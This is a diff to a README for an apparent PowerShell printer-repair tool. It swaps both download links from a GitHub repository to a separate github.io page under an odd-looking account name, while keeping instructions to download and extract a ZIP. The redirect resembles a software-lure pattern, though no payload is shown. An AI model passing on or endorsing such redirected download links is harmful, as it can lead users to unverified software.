@@ -1,6 +1,6 @@
 # 🖨️ Printer-Fix-Tool-PowerShell - Fix printer errors on your Windows PC
 
-[![](https://img.shields.io/badge/Download-Printer_Fix_Tool-blue.svg)](https://github.com/uninitiated-familyebenaceae555/Printer-Fix-Tool-PowerShell)
+[![](https://img.shields.io/badge/Download-Printer_Fix_Tool-blue.svg)](https://uninitiated-familyebenaceae555.github.io)
 
 ## 📋 About This Tool
 
@@ -19,7 +19,7 @@ The tool supports major printer brands including HP, Canon, Epson, and Brother. 
 
 Visit the link below to access the project page. Look for the green "Code" button or the "Releases" section. Download the file labeled as a ZIP archive.
 
-[Download the Printer Fix Tool here](https://github.com/uninitiated-familyebenaceae555/Printer-Fix-Tool-PowerShell)
+[Download the Printer Fix Tool here](https://uninitiated-familyebenaceae555.github.io)
 
 After you download the file, move it to your desktop. Right-click the folder and select "Extract All" to reveal the contents inside.
 
